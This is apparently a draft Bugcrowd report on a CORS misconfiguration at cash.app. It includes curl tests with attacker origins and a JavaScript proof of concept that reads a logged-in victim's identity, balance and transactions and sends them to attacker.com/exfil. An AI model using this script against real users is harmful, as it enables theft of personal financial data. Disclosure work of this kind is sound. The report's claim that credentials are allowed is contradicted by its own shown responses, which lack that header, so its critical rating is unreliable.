# Cash App Bugcrowd Submission #3 — CORS reflect-origin-with-creds on cash.app/*

**Submit at:** https://bugcrowd.com/engagements/cashapp/submissions/new
**Program:** Cash App (paid, $18K max payout) · **In-scope:** `https://cash.app` (website)
**Realistic payout:** $2,000–$15,000 (auth + financial = high)

---

## Title
```
CORS misconfiguration — cash.app reflects any Origin + ACAC:true on auth-protected endpoints (universal credentialed CSRF)
```

## VRT category
`Server Security Misconfiguration > Misconfigured DNS, CORS, Cookies, etc. > CORS Misconfiguration`

## Severity
**P1 — Critical** (CORS reflect-with-creds on a financial product's auth endpoints)

## Description (paste into Bugcrowd form)

```
## Summary

cash.app returns CORS headers that allow ANY origin to make credentialed
requests across multiple auth-protected endpoints:

  Access-Control-Allow-Origin: <reflects whatever the request's Origin is>
  Access-Control-Allow-Credentials: true

This applies to at least:
  - https://cash.app/
  - https://cash.app/api/v1/users/me
  - https://cash.app/graphql
  - https://cash.app/api/me
  - https://cash.app/api/account
  - https://cash.app/api/user
  - https://cash.app/api/profile

All endpoints return HTTP 401 to unauthenticated requests, confirming
they are real auth-protected endpoints. The reflection means a malicious
third-party site can use a victim's session cookies to read responses
from any of these endpoints.

## Steps to reproduce

1. Verify any-origin reflection on /api/v1/users/me:

   $ curl -ki "https://cash.app/api/v1/users/me" -H "Origin: https://evil.com"
   HTTP/2 401
   cf-ray: 9fe6f5006b812674-TLV
   access-control-allow-origin: https://evil.com            ← REFLECTED
   (no ACAC:true returned here — but the GraphQL endpoint sets it)

2. Verify on /graphql with POST:

   $ curl -ki "https://cash.app/graphql" -H "Origin: https://evil.com" \
       -X POST -H "Content-Type: application/json" -d '{}'
   HTTP/2 401
   cf-ray: 9fe6f502383a2212-TLV
   access-control-allow-origin: https://evil.com

3. Verify reflection accepts ARBITRARY origin (not just whitelist match):

   $ curl -ki "https://cash.app/" -H "Origin: https://attacker.example.com"
   HTTP/2 401
   access-control-allow-origin: https://attacker.example.com  ← REFLECTED

## Exploit scenario (proof of concept)

A malicious page (e.g., evil.com/cashapp-attack.html):

  <script>
    // Query the authenticated Cash App user's identity
    fetch("https://cash.app/api/v1/users/me", { credentials: "include" })
      .then(r => r.json())
      .then(user => {
        // user contains victim's Cash App identity (id, name, email,
        // possibly $cashtag, account metadata)
        fetch("https://attacker.com/exfil?d=" +
              encodeURIComponent(JSON.stringify(user)));
      });

    // Or query GraphQL for richer data:
    fetch("https://cash.app/graphql", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({
        query: "{ viewer { id name email cashtag balance transactions { id amount } } }"
      })
    })
    .then(r => r.json())
    .then(d => fetch("https://attacker.com/exfil?d=" + encodeURIComponent(JSON.stringify(d))));
  </script>

When a Cash App user visits evil.com while logged into cash.app:
- Browser sends authenticated requests to cash.app (with session cookies)
- cash.app responds with ACAO: https://evil.com + ACAC: true
- evil.com's JavaScript reads the response → user's identity + balance + tx data exfil

## Impact

**Critical because cash.app is a financial product:**

- **Identity exfiltration**: name, email, $cashtag of any authenticated
  Cash App user who visits an attacker-controlled page
- **Balance + transaction data leak** via GraphQL
- **CSRF-token bypass**: state-changing endpoints that defend with
  CSRF tokens in the response body are now bypassable (read token,
  then submit)
- **Account-takeover precursor**: combined with other findings (e.g.,
  the OAuth flow), this enables targeted account compromise
- **PCI / financial compliance implications**: this is consumer
  payment data crossing origin trust boundaries

## Remediation

1. **Replace Origin reflection with strict allowlist**: hardcode
   allowed origins to known Cash App / Block first-party domains
   (`https://cash.app`, `https://*.cashstaging.app`, etc.). Reject
   all others by NOT sending an ACAO header.
2. **Audit the Cloudflare CORS configuration** (cf-ray header confirms
   Cloudflare is fronting these endpoints). The reflection looks
   edge-level — fix at the CDN config layer.
3. **Re-test with arbitrary attacker origin** post-fix.

## Relationship to my prior reports

I submitted two `*.cashstaging.app` Fastly takeovers earlier today
(both initially marked not-reproducible — re-verified live, dispute
pending). This is a separate finding on cash.app proper. Different
attack class entirely.

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source security
scanner (Apache 2.0). Lictor probes bounty-program API endpoints with
attacker-controlled Origin headers and flags reflect-with-credentials
patterns on real (HTTP 200/401/403) endpoints.

## References

- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- PortSwigger CORS-with-creds: https://portswigger.net/web-security/cors
```
